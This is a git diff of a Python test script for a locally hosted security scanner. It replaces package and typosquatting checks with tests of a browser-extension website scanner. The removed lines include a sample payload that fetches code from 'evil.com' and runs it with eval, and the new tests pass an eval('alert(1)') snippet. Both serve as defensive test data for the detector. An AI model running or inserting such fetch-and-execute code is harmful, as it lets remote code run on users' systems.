@@ -4,37 +4,47 @@ import pytest
 
 async def test_api():
     async with aiohttp.ClientSession() as session:
-        # Test 1: Safe package
-        print("\nTesting safe package (requests)...")
-        async with session.post('http://localhost:8000/api/v1/check-package', 
+        print("\nTesting Extension Scanner API...")
+        
+        # Test 1: Safe website
+        print("\nTesting safe website...")
+        response = await session.post(
+            'http://localhost:8000/api/v1/extension/scan',
             json={
-                "name": "requests",
-                "ecosystem": "pypi"
-            }) as response:
-            result = await response.json()
-            print("Result:", result)
-            assert response.status == 200
+                "url": "https://python.org",
+                "content": "<html><h1>Welcome to Python</h1></html>",
+                "scripts": ["console.log(\"Hello\")"]
+            }
+        )
+        result = await response.json()
+        assert result["trustScore"] == 100
+        assert not result["isSuspicious"]
+        print("✅ Safe website test passed")
 
-        # Test 2: Suspicious package
-        print("\nTesting suspicious package (reqeusts)...")
-        async with session.post('http://localhost:8000/api/v1/check-package', 
-            json={
-                "name": "reqeusts",  # Typo!
-                "ecosystem": "pypi"
-            }) as response:
-            result = await response.json()
-            print("Result:", result)
-            assert result["is_suspicious"] == True
-
-        # Test 3: Malicious code
+        # Test 2: Malicious code
         print("\nTesting malicious code...")
-        async with session.post('http://localhost:8000/api/v1/scan-code', 
+        response = await session.post(
+            'http://localhost:8000/api/v1/extension/scan',
             json={
-                "code": "eval(requests.get('http://evil.com/code.py').text)"
-            }) as response:
-            result = await response.json()
-            print("Result:", result)
-            assert result["is_suspicious"] == True
+                "url": "https://example.com",
+                "content": "<html><script>eval(\"alert(1)\")</script></html>",
+                "scripts": ["eval(\"alert(1)\")"]
+            }
+        )
+        result = await response.json()
+        assert result["trustScore"] == 30
+        assert result["isSuspicious"]
+        assert any("CRITICAL" in alert for alert in result["alerts"])
+        print("✅ Malicious code test passed")
+
+        # Test 3: Error handling
+        print("\nTesting error handling...")
+        response = await session.post(
+            'http://localhost:8000/api/v1/extension/scan',
+            json={}  # Missing required data
+        )
+        assert response.status in (400, 500)
+        print("✅ Error handling test passed")
 
 if __name__ == "__main__":
     asyncio.run(test_api()) 
